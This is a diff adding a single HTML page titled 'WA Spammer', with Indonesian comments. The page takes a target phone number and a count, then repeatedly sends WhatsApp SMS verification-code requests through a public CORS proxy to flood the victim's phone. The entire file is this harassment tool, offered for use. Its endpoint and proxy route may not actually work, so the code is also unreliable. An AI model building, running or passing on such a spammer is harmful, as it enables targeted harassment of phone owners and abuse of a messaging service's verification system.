@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WA Spammer - Proxy Mode</title>
+</head>
+<body>
+    <h1>WA Spammer (Proxy Mode)</h1>
+    <input id="target" placeholder="628xxx">
+    <input id="jumlah" type="number" value="10">
+    <button onclick="startSpam()">SPAM</button>
+    <div id="log"></div>
+
+    <script>
+    async function startSpam() {
+        const target = document.getElementById('target').value;
+        const jumlah = document.getElementById('jumlah').value;
+        
+        for(let i=1; i<=jumlah; i++) {
+            try {
+                // Pake proxy CORS
+                const response = await fetch(`https://cors-anywhere.herokuapp.com/https://web.whatsapp.com/v1/code`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({cc: target.substr(0,2), in: target.substr(2), method: 'sms'})
+                });
+                
+                document.getElementById('log').innerHTML += `[${i}] ${response.status}<br>`;
+            } catch(e) {
+                document.getElementById('log').innerHTML += `[${i}] Error: ${e.message}<br>`;
+            }
+            await new Promise(r => setTimeout(r, 2000));
+        }
+    }
+    </script>
+</body>
+</html>
